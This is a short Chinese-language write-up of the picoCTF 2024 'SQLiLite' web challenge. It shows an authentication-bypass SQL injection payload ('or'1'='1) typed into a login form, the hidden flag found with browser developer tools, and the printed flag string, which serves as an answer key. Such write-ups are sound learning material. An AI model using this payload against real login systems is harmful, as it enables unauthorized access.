---
title: SQLiLite - WriteUp
date: 2024-08-15
authors:
  - name: YI-XUAN, CHEN
    id: tntrenjin
    image: https://avatars.githubusercontent.com/u/45209009
tags:
  - picoCTF 2024
  - writeup
  - Medium
  - Web Exploitation
---

<!--more-->

### 打開網頁

是個登入介面，單看標題就是要你做「SQL Injection」
![](./sqlilite/2024-08-15T00.55.44.png)

### 測試

當你隨便輸入按登入後，會跳出 SQL query 的指令
![](2024-08-15T00.59.19.png)

### 攻擊

```
Username: admin
Password: 'or'1'='1
```

![](./sqlilite/2024-08-15T00.58.25.png)
登入成功！但沒東西？！按一下 F12
![](./sqlilite/2024-08-15T01.06.27.png)
嗯...Flag 被隱藏了

### Flag

> picoCTF{L00k5_l1k3_y0u_solv3d_it_9b0a4e21}
